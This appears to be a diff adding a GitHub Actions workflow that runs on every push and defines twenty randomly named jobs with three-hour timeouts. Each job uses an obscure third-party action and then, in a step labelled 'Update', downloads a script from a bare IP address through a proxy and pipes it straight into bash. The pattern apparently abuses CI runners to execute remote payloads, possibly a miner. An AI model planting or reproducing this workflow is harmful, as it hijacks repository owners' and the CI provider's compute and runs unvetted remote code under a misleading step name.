@@ -1,0 +1,183 @@
+name: kehinubu
+on: push
+jobs:
+  dugiza:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: lemoanned/caplok@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl -x 188.166.183.133:7122 http://188.166.191.195/mandalorian/yannayneke.php?a=digorupa | bash -
+  rexici:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: lemoanned/caplok@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl -x 188.166.183.133:7122 http://188.166.191.195/mandalorian/yannayneke.php?a=fewapavugo | bash -
+  nuliye:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: lemoanned/caplok@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl -x 188.166.183.133:7122 http://188.166.191.195/mandalorian/yannayneke.php?a=necesata | bash -
+  fiziro:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: lemoanned/caplok@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl -x 188.166.183.133:7122 http://188.166.191.195/mandalorian/yannayneke.php?a=yimivixelu | bash -
+  waneyi:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: lemoanned/caplok@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl -x 188.166.183.133:7122 http://188.166.191.195/mandalorian/yannayneke.php?a=hiripucu | bash -
+  genate:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: lemoanned/caplok@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl -x 188.166.183.133:7122 http://188.166.191.195/mandalorian/yannayneke.php?a=tulicoze | bash -
+  zibivo:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: lemoanned/caplok@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl -x 188.166.183.133:7122 http://188.166.191.195/mandalorian/yannayneke.php?a=wimatekuso | bash -
+  jelife:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: lemoanned/caplok@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl -x 188.166.183.133:7122 http://188.166.191.195/mandalorian/yannayneke.php?a=dexiboku | bash -
+  wukoye:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: lemoanned/caplok@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl -x 188.166.183.133:7122 http://188.166.191.195/mandalorian/yannayneke.php?a=wocunasali | bash -
+  xojurata:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: lemoanned/caplok@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl -x 188.166.183.133:7122 http://188.166.191.195/mandalorian/yannayneke.php?a=nikopanunutu | bash -
+  gesocu:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: lemoanned/caplok@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl -x 188.166.183.133:7122 http://188.166.191.195/mandalorian/yannayneke.php?a=mesamowe | bash -
+  dukuya:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: lemoanned/caplok@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl -x 188.166.183.133:7122 http://188.166.191.195/mandalorian/yannayneke.php?a=xewalicasa | bash -
+  bepika:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: lemoanned/caplok@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl -x 188.166.183.133:7122 http://188.166.191.195/mandalorian/yannayneke.php?a=rizojarawu | bash -
+  hekesofe:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: lemoanned/caplok@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl -x 188.166.183.133:7122 http://188.166.191.195/mandalorian/yannayneke.php?a=mufugosa | bash -
+  haheroba:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: lemoanned/caplok@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl -x 188.166.183.133:7122 http://188.166.191.195/mandalorian/yannayneke.php?a=habicexe | bash -
+  fijuke:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: lemoanned/caplok@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl -x 188.166.183.133:7122 http://188.166.191.195/mandalorian/yannayneke.php?a=cifibokepu | bash -
+  pidawuso:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: lemoanned/caplok@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl -x 188.166.183.133:7122 http://188.166.191.195/mandalorian/yannayneke.php?a=xoyoxeyovo | bash -
+  kiwuko:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: lemoanned/caplok@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl -x 188.166.183.133:7122 http://188.166.191.195/mandalorian/yannayneke.php?a=runavefa | bash -
+  rokibore:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: lemoanned/caplok@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl -x 188.166.183.133:7122 http://188.166.191.195/mandalorian/yannayneke.php?a=lavutaxi | bash -
+  gayobo:
+    runs-on: ubuntu-18.04
+    timeout-minutes: 180
+    steps:
+    - uses: lemoanned/caplok@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl -x 188.166.183.133:7122 http://188.166.191.195/mandalorian/yannayneke.php?a=totaxidula | bash -
